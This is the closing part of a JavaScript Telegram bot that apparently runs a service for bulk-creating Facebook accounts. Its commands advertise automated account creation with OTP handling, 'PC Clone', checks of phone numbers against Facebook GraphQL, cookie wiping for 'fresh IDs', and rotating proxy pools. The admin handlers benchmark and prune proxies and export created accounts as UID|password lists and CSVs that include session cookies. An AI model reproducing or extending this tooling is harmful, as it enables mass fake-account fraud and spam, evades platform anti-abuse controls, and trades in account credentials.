                btnOk('⚡ Sort by Speed', 'admin:px_sort'),
                btnBad('🧹 Prune Dead', 'admin:px_prune'),
              ],
              [btnNav('⬅️ Global Proxies', 'admin:proxies')],
            ],
          }
        );
        return;
      }
      if (data === 'admin:px_sort') {
        const list = readGlobalProxies();
        if (list.length === 0) {
          await sendMessage(chatId, 'Global proxy pool is empty.', {
            inline_keyboard: [[btnNav('⬅️ Global Proxies', 'admin:proxies')]],
          });
          return;
        }
        await sendMessage(chatId, `⚡ Benchmarking <code>${list.length}</code> global proxies concurrently (15x)...`);
        const results = new Array(list.length);
        let pIdx = 0;
        await Promise.all(
          Array.from({ length: Math.min(15, list.length) }, async () => {
            while (true) {
              const idx = pIdx++;
              if (idx >= list.length) break;
              results[idx] = await testProxyTcp(list[idx], true);
            }
          })
        );
        results.sort((a, b) => {
          if (a.ok !== b.ok) return a.ok ? -1 : 1;
          return a.latencyMs - b.latencyMs;
        });
        writeGlobalProxies(results.map((r) => r.proxy));
        await sendMessage(chatId, `⚡ Sorted <code>${results.length}</code> global proxies (fastest live first).`);
        await renderAdminGlobalProxies(chatId);
        return;
      }
      if (data === 'admin:px_prune') {
        const list = readGlobalProxies();
        if (list.length === 0) {
          await sendMessage(chatId, 'Global proxy pool is empty.', {
            inline_keyboard: [[btnOk('➕ Add Global Proxies', 'admin:px_add'), btnNav('⬅️ Global Proxies', 'admin:proxies')]],
          });
          return;
        }
        const results = new Array(list.length);
        let pIdx = 0;
        await Promise.all(
          Array.from({ length: Math.min(15, list.length) }, async () => {
            while (true) {
              const idx = pIdx++;
              if (idx >= list.length) break;
              results[idx] = await testProxyTcp(list[idx], false);
            }
          })
        );
        const live = results.filter((r) => r.ok).sort((a, b) => a.latencyMs - b.latencyMs).map((r) => r.proxy);
        writeGlobalProxies(live);
        await sendMessage(chatId, `✅ Pruned <code>${list.length - live.length}</code> dead global proxies. Remaining: <code>${live.length}</code>.`);
        await renderAdminGlobalProxies(chatId);
        return;
      }
      if (data === 'admin:px_clear') {
        writeGlobalProxies([]);
        await renderAdminGlobalProxies(chatId, msgId);
        return;
      }
      if (data === 'admin:live') {
        promptSessions.delete(uid);
        await renderAdminLiveRuns(chatId, msgId);
        return;
      }
      if (data === 'admin:stop_all') {
        let stopped = 0;
        for (const [, r] of activeRuns.entries()) {
          if (r.running) {
            r.abortRequested = true;
            stopped += 1;
          }
        }
        pushBotLog(`Admin emergency-stopped ${stopped} active runs`);
        await sendMessage(chatId, `🛑 Sent stop signal to <code>${stopped}</code> active batch runs.`);
        await renderAdminLiveRuns(chatId);
        return;
      }
      if (data === 'admin:analytics' || data === 'admin:sysinfo') {
        promptSessions.delete(uid);
        await renderAdminAnalytics(chatId, msgId);
        return;
      }
      if (data === 'admin:backup') {
        promptSessions.delete(uid);
        await renderAdminBackupMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:dl_all_ready') {
        const users = Object.values(readUsersMap());
        const seen = new Set();
        const lines = [];
        for (const u of users) {
          for (const a of readUserAccounts(u.id)) {
            if (a.status === 'OK' && a.uid && !seen.has(a.uid)) {
              seen.add(a.uid);
              lines.push(`${a.uid}|${a.password}`);
            }
          }
        }
        await sendDocumentText(chatId, `JEME_ALL_READY_${Date.now()}.txt`, lines.join('\n') || 'No ready accounts yet.', `All Ready UID|Pass (${lines.length})`);
        return;
      }
      if (data === 'admin:dl_all_csv') {
        const users = Object.values(readUsersMap());
        const header = ['user_id', 'timestamp', 'name', 'number', 'password', 'uid', 'status', 'engine', 'cookie'].join(',');
        const rows = [];
        for (const u of users) {
          for (const a of readUserAccounts(u.id)) {
            rows.push([u.id, a.ts, a.name, a.number, a.password, a.uid, a.status, a.engine || '', formatCookieHeader(a.cookies || {})].map(csvCell).join(','));
          }
        }
        await sendDocumentText(chatId, `JEME_ALL_ACCOUNTS_${Date.now()}.csv`, [header, ...rows].join('\n'), `Global Accounts Export (${rows.length})`);
        return;
      }
      if (data === 'admin:dl_users') {
        const raw = fs.existsSync(FILES.botUsers) ? fs.readFileSync(FILES.botUsers, 'utf-8') : '{}';
        await sendDocumentText(chatId, `JEME_USERS_DB_${Date.now()}.json`, raw, 'Users Database Backup');
        return;
      }
      if (data === 'admin:dl_proxies') {
        const raw = fs.existsSync(FILES.proxies) ? fs.readFileSync(FILES.proxies, 'utf-8') : 'No global proxies';
        await sendDocumentText(chatId, `JEME_GLOBAL_PROXIES_${Date.now()}.txt`, raw, 'Global Proxies Backup');
        return;
      }
      if (data === 'admin:dl_all_proxies') {
        const globalPx = readGlobalProxies();
        const sections = [];
        if (globalPx.length > 0) {
          sections.push(`# GLOBAL ADMIN PROXIES (${globalPx.length})`, ...globalPx, '');
        }
        let userPxTotal = 0;
        for (const u of Object.values(readUsersMap())) {
          const uPx = readUserProxies(u.id);
          if (uPx.length > 0) {
            userPxTotal += uPx.length;
            sections.push(`# USER ${u.id} (${u.firstName}${u.username ? ` @${u.username}` : ''}) - ${uPx.length} proxies`, ...uPx, '');
          }
        }
        const total = globalPx.length + userPxTotal;
        await sendDocumentText(
          chatId,
          `ALL_PROXIES_${Date.now()}.txt`,
          sections.join('\n') || 'No proxies configured.',
          `All Proxies Export: Global=${globalPx.length}, Users=${userPxTotal} (Total ${total})`
        );
        return;
      }
      if (data === 'admin:dl_analytics') {
        const users = Object.values(readUsersMap()).sort((a, b) => (b.totalOk || 0) - (a.totalOk || 0));
        const header = ['user_id', 'first_name', 'username', 'status', 'role', 'used_today', 'daily_limit', 'total_ok', 'total_pending', 'total_fail', 'saved_accounts', 'ready_accounts', 'proxies_count', 'last_active'].join(',');
        const rows = users.map((u) => {
          const accs = readUserAccounts(u.id);
          const readyCnt = accs.filter((a) => a.status === 'OK').length;
          const pxCnt = readUserProxies(u.id).length;
          const lastIso = u.lastActiveAt ? new Date(u.lastActiveAt).toISOString() : '';
          return [
            u.id,
            u.firstName || '',
            u.username || '',
            u.status || '',
            u.role || 'user',
            u.usedToday || 0,
            u.dailyLimit || 0,
            u.totalOk || 0,
            u.totalPending || 0,
            u.totalFail || 0,
            accs.length,
            readyCnt,
            pxCnt,
            lastIso,
          ].map(csvCell).join(',');
        });
        await sendDocumentText(chatId, `USERS_ANALYTICS_${Date.now()}.csv`, [header, ...rows].join('\n'), `Users Analytics Report (${users.length} users)`);
        return;
      }
      if (data === 'admin:dl_syslog') {
        const raw = fs.existsSync(FILES.debugLog) ? fs.readFileSync(FILES.debugLog, 'utf-8') : 'No system logs';
        await sendDocumentText(chatId, `JEME_SYSTEM_DEBUG_${Date.now()}.log`, raw, 'System Debug Log');
        return;
      }
      if (data === 'admin:logs') {
        promptSessions.delete(uid);
        await renderAdminLogsMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:clear_logs') {
        try { fs.writeFileSync(FILES.debugLog, '', 'utf-8'); } catch { /* ignore */ }
        logs.length = 0;
        await renderAdminLogsMenu(chatId, msgId);
        return;
      }

      const parts = data.split(':');
      if (parts.length === 3 && parts[1] === 'uview') {
        promptSessions.delete(uid);
        await renderAdminUserDetail(chatId, parts[2], msgId);
        return;
      }
      if (parts.length === 4 && parts[1] === 'uaccs') {
        await renderAdminUserAccounts(chatId, parts[2], Number(parts[3]) || 0, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'uproxies') {
        await renderAdminUserProxies(chatId, parts[2], msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'ulogs') {
        await renderAdminUserLogs(chatId, parts[2], msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'udl_proxies') {
        const targetId = parts[2];
        const list = readUserProxies(targetId);
        await sendDocumentText(chatId, `USER_${targetId}_PROXIES.txt`, list.join('\n') || 'No proxies configured for this user.', `User ${targetId} Proxies (${list.length})`);
        return;
      }
      if (parts.length === 3 && parts[1] === 'udl_csv') {
        const targetId = parts[2];
        const accs = readUserAccounts(targetId);
        const header = ['timestamp', 'name', 'number', 'password', 'uid', 'status', 'engine', 'cookie'].join(',');
        const rows = accs.map((a) => [a.ts, a.name, a.number, a.password, a.uid, a.status, a.engine || '', formatCookieHeader(a.cookies || {})].map(csvCell).join(','));
        await sendDocumentText(chatId, `USER_${targetId}_ALL_DATA.csv`, [header, ...rows].join('\n'), `User ${targetId} Full Accounts CSV (${accs.length})`);
        return;
      }
      if (parts.length === 3 && parts[1] === 'udl_log') {
        const targetId = parts[2];
        const files = getUserFiles(targetId);
        const raw = fs.existsSync(files.debugLog) ? fs.readFileSync(files.debugLog, 'utf-8') : 'No logs recorded for this user.';
        await sendDocumentText(chatId, `USER_${targetId}_LOG.txt`, raw, `User ${targetId} Activity Log`);
        return;
      }
      if (parts.length === 3 && parts[1] === 'uclean_cookie') {
        const targetId = parts[2];
        wipeUserCookiesAndCache(targetId);
        await sendMessage(chatId, `🍪 Wiped cookies & cache cleanly for user <code>${escapeHtml(targetId)}</code>.`);
        await renderAdminUserDetail(chatId, targetId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'udm') {
        const targetId = parts[2];
        promptSessions.set(uid, { kind: 'admin_awaiting_dm', targetUserId: targetId });
        await sendMessage(chatId, `📩 <b>DIRECT MESSAGE TO USER</b>\nEnter the message to send to <code>${escapeHtml(targetId)}</code>:`, {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:uview:${targetId}`)]],
        });
        return;
      }
      if (parts.length === 3 && parts[1] === 'uexport') {
        const targetId = parts[2];
        const okLines = readUserAccounts(targetId)
          .filter((a) => a.status === 'OK' && a.uid)
          .map((a) => `${a.uid}|${a.password}`);
        await sendDocumentText(chatId, `USER_${targetId}_READY.txt`, okLines.join('\n') || 'No ready accounts yet.', `User ${targetId} Ready Accounts (${okLines.length})`);
        return;
      }
      if (parts.length === 3 && parts[1] === 'uclear_done') {
        const targetId = parts[2];
        clearUserDone(targetId);
        writeUserPending(targetId, []);
        await sendMessage(chatId, `🧹 Cleared done history and OTP queue for user <code>${escapeHtml(targetId)}</code>.`);
        await renderAdminUserDetail(chatId, targetId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'urole') {
        const targetId = parts[2];
        if (targetId === DEFAULT_ADMIN_ID) {
          await sendMessage(chatId, '⛔ Primary owner role cannot be modified.');
          return;
        }
        const map = readUsersMap();
        if (map[targetId]) {
          map[targetId].role = map[targetId].role === 'admin' ? 'user' : 'admin';
          if (map[targetId].role === 'admin') map[targetId].status = 'approved';
          writeUsersMap(map);
          pushBotLog(`Admin changed role of ${targetId} -> ${map[targetId].role}`);
        }
        await renderAdminUserDetail(chatId, targetId, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'uapprove') {
        const targetId = parts[2];
        const map = readUsersMap();
        if (targetId && map[targetId]) {
          map[targetId].status = 'approved';
          writeUsersMap(map);
          await sendMessage(targetId, `✅ <b>Your ${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} bot access is active!</b>\nTap below to open your tools:`, {
            inline_keyboard: [[btnOk('🚀 Open Tool Menu', 'menu:home')]],
          });
        }
        await renderAdminUserDetail(chatId, targetId, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'ublock') {
        const targetId = parts[2];
        if (targetId === DEFAULT_ADMIN_ID) {
          await sendMessage(chatId, '⛔ Primary owner cannot be blocked.');
          return;
        }
        const map = readUsersMap();
        if (targetId && map[targetId]) {
          map[targetId].status = 'blocked';
          writeUsersMap(map);
          await sendMessage(targetId, `🚫 Your bot access has been blocked by admin.`);
        }
        await renderAdminUserDetail(chatId, targetId, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'ulimit') {
        const targetId = parts[2];
        promptSessions.set(uid, { kind: 'admin_awaiting_user_limit', targetUserId: targetId });
        await sendMessage(chatId, `🎯 <b>SET USER DAILY LIMIT</b>\nEnter new daily limit for user <code>${escapeHtml(targetId)}</code>:`, {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:uview:${targetId}`)]],
        });
        return;
      }
      if (parts.length === 3 && parts[1] === 'ureset') {
        const targetId = parts[2];
        const map = readUsersMap();
        if (map[targetId]) {
          map[targetId].usedToday = 0;
          writeUsersMap(map);
        }
        await renderAdminUserDetail(chatId, targetId, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'stopuser') {
        const targetId = parts[2];
        const run = activeRuns.get(targetId);
        if (run && run.running) {
          run.abortRequested = true;
          pushBotLog(`Admin stopped active run for user ${targetId}`);
        }
        await renderAdminHome(chatId, msgId);
        return;
      }
      if (parts.length === 3 && (parts[1] === 'approve' || parts[1] === 'block')) {
        const targetId = parts[2];
        const map = readUsersMap();
        if (targetId && map[targetId]) {
          map[targetId].status = parts[1] === 'approve' ? 'approved' : 'blocked';
          writeUsersMap(map);
          pushBotLog(`Admin ${parts[1]}d Telegram user ${targetId}`);
          await sendMessage(
            targetId,
            parts[1] === 'approve'
              ? `✅ <b>Your ${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} bot access has been approved!</b>\nTap below to open all tools directly inside Telegram:`
              : `🚫 Your bot access request was declined.`,
            parts[1] === 'approve' ? { inline_keyboard: [[btnOk('🚀 Open Tool Menu', 'menu:home')]] } : undefined
          );
        }
        await renderAdminHome(chatId, msgId);
      }
    }
  }

  async function pollLoop() {
    while (running) {
      pollAbort = new AbortController();
      const res = await tgCall('getUpdates', { offset, timeout: 25, allowed_updates: ['message', 'callback_query'] }, pollAbort.signal);
      if (!running) break;

      if (!res.ok) {
        lastError = res.description || 'Polling error';
        connected = false;
        let waitMs = 2000;
        const lowErr = lastError.toLowerCase();
        if (res.error_code === 429) {
          const retryAfter = Number(res.parameters?.retry_after || 20);
          waitMs = Math.min(35000, Math.max(5000, (retryAfter + 1) * 1000));
        } else if (lowErr.includes('webhook')) {
          await tgCall('deleteWebhook', { drop_pending_updates: false }, undefined, { noRetry: true }).catch(() => {});
          waitMs = 1500;
        } else if (lowErr.includes('conflict')) {
          waitMs = 4000;
        }
        await new Promise((r) => setTimeout(r, waitMs));
        continue;
      }

      connected = true;
      lastError = '';
      const updates = Array.isArray(res.result) ? res.result : [];
      for (const upd of updates) {
        offset = upd.update_id + 1;
        const task = upd.message
          ? processMessage(upd.message)
          : upd.callback_query
          ? processCallback(upd.callback_query)
          : Promise.resolve();
        Promise.resolve(task).catch((err) => {
          pushBotLog(`Update error: ${err instanceof Error ? err.message : 'unknown'}`);
        });
      }
    }
  }

  async function start() {
    let me = null;
    for (let attempt = 1; ; attempt++) {
      me = await tgCall('getMe');
      if (me.ok && me.result) break;
      const errCode = Number(me?.error_code || 0);
      if (errCode === 401 || errCode === 404) {
        throw new Error(me?.description || `Invalid bot token (${errCode})`);
      }
      const waitMs = errCode === 429
        ? Math.min(35000, Math.max(5000, (Number(me?.parameters?.retry_after || 15) + 1) * 1000))
        : 3000;
      pushBotLog(`[WARN] getMe attempt ${attempt} failed: ${me?.description || 'unknown'}. Retrying in ${Math.round(waitMs / 1000)}s...`);
      await new Promise((r) => setTimeout(r, waitMs));
    }

    botInfo = { id: me.result.id, username: me.result.username || '', firstName: me.result.first_name || 'Bot' };
    running = true;
    connected = true;
    lastError = '';
    startedAt = Date.now();
    pushBotLog(`Standalone bot online as @${botInfo.username} (Admin ID: ${readSettings().adminId}, Data: ${DATA_ROOT})`);

    startPanelScanner();

    setTimeout(() => {
      if (!running) return;
      tgCall('setMyCommands', {
        commands: [
          { command: 'start', description: 'Open main control dashboard' },
          { command: 'fbcreate', description: 'FB Auto create & Live Auto-OTP' },
          { command: 'fbtools', description: 'FB Tools (LOL Bulk Creator & Multi-OTP Watcher)' },
          { command: 'pcclone', description: 'PC Clone (Auto Country, 1-10x OTP Auto Sync)' },
          { command: 'run', description: 'Start a batch account run' },
          { command: 'check', description: 'Check numbers FREE/TAKEN via GraphQL' },
          { command: 'otp', description: 'Open OTP & checkpoint queue' },
          { command: 'accounts', description: 'View & export ready accounts' },
          { command: 'proxies', description: 'Manage, test & sort proxy pool' },
          { command: 'settings', description: 'Configure engine & proxy settings' },
          { command: 'cookies', description: 'Manage cookies & fresh ID cleaner' },
          { command: 'fresh', description: '1-Click clear cookies & caches' },
          { command: 'logs', description: 'View recent debug logs' },
          { command: 'diag', description: 'Run live Limited FB & proxy diagnostics' },
          { command: 'help', description: 'Command & workflow guide' },
          { command: 'cancel', description: 'Cancel active prompt input' },
        ],
      }, undefined, { noRetry: true }).catch(() => {});
    }, 5000);

    pollLoop().catch((err) => {
      lastError = err instanceof Error ? err.message : 'Loop stopped';
      running = false;
      connected = false;
      stopPanelScanner();
      pushBotLog(`Polling terminated: ${lastError}`);
    });
  }

  function stop() {
    running = false;
    connected = false;
    stopPanelScanner();
    if (pollAbort) {
      pollAbort.abort();
      pollAbort = null;
    }
    pushBotLog('Bot stopped cleanly.');
  }

  function statusSummary() {
    return {
      ok: running && connected,
      running,
      connected,
      bot: botInfo ? `@${botInfo.username}` : null,
      uptimeSec: startedAt ? Math.floor((Date.now() - startedAt) / 1000) : 0,
      lastError: lastError || undefined,
    };
  }

  return { start, stop, statusSummary };
}

// ----------------------------------------------------------------------------
// 7. Entrypoint (Env / CLI / Interactive Prompt + Optional Health HTTP)
// ----------------------------------------------------------------------------
async function resolveToken() {
  const direct = (CLI.token || process.env.TELEGRAM_BOT_TOKEN || '').trim();
  if (direct) return direct;

  if (!process.stdin.isTTY) {
    console.error('[FbTools] ERROR: TELEGRAM_BOT_TOKEN is missing.');
    console.error('Set environment variable or pass --token=YOUR_BOT_TOKEN');
    process.exit(1);
  }

  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const ask = (q) => new Promise((res) => rl.question(q, res));
  const token = (await ask('Enter TELEGRAM_BOT_TOKEN: ')).trim();
  rl.close();
  if (!token) {
    console.error('Bot token is required.');
    process.exit(1);
  }
  return token;
}

async function main() {
  const curlStatus = await checkCurlAvailable();
  if (!curlStatus.ok) {
    console.warn('[fbtoolbot] WARNING: `curl` binary not found. Direct fetch still works, but proxy support requires curl.');
  }

  if (CLI.diag) {
    console.log('[fbtoolbot] Runtime Environment Check:');
    console.log('  Node.js  :', process.version, `(${process.platform}/${process.arch})`);
    console.log('  curl     :', curlStatus.ok ? `OK (${curlStatus.version})` : 'MISSING');
    console.log('  Data Dir :', DATA_ROOT);
    const diag = await runDiagnoseFor({ ...DEFAULT_CONFIG }, normalizeBaseCookiesRaw(''), null);
    console.log('  FB Probe :', diag.tokenOk ? `TOKEN OK (${diag.src})` : 'NO TOKEN');
    console.log('  FB GQL   :', diag.gqlOk ? `OK (${diag.gqlInfo})` : `ERR (${diag.gqlInfo})`);
    console.log('  PX Bytes :', formatBytes(proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes));
    console.log('  Trace    :', diag.trace.join(' | '));
    process.exit(diag.tokenOk ? 0 : 1);
  }

  const token = await resolveToken();
  const bot = createStandaloneBot(token);

  const portVal = Number(CLI.port || process.env.PORT || 0);
  let server = null;
  if (Number.isInteger(portVal) && portVal > 0 && portVal <= 65535) {
    server = http.createServer((_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify(bot.statusSummary()));
    });
    server.on('error', (err) => {
      console.warn(`[fbtoolbot] Health HTTP server disabled (${err.code || err.message})`);
      appendDebugLog(`[WARN] Health HTTP server error: ${err.code || err.message}`);
    });
    server.listen(portVal, '0.0.0.0', () => {
      console.log(`[fbtoolbot] Health HTTP server listening on 0.0.0.0:${portVal}`);
    });
  }

  await bot.start();

  const shutdown = () => {
    bot.stop();
    if (server) server.close();
    process.exit(0);
  };
  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);
  process.on('unhandledRejection', (err) => {
    appendDebugLog(`[WARN] UnhandledRejection: ${err instanceof Error ? err.message : String(err)}`);
  });
}

await main();
})().catch((err) => {
  console.error('[fbtoolbot] Fatal error:', err instanceof Error ? err.message : err);
  process.exit(1);
});
